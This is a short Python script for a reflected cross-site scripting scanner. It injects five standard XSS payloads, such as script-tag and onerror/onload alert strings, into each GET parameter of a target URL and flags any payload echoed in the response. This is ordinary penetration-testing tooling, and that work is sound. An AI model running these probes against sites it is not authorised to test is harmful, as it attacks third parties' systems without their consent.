import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common payloads for fast scanning
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><svg/onload=alert(1)>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def scan(url):
    # Parse parameters
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        print("[!] URL must have at least one GET parameter (e.g. ?q=searchterm)")
        return

    print(f"[*] Scanning {url}")
    for param in qs:
        for payload in XSS_PAYLOADS:
            test_url = inject_payload(url, param, payload)
            try:
                resp = requests.get(test_url, timeout=10)
                if payload in resp.text:
                    print(f"[+] Possible XSS in parameter '{param}' with payload: {payload}")
                    print(f"    {test_url}")
            except Exception as e:
                print(f"[!] Error requesting {test_url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple XSS Scanner (reflected)")
    parser.add_argument('url', help="Target URL with parameters (e.g. https://site.com/search?q=test)")
    args = parser.parse_args()
    scan(args.url)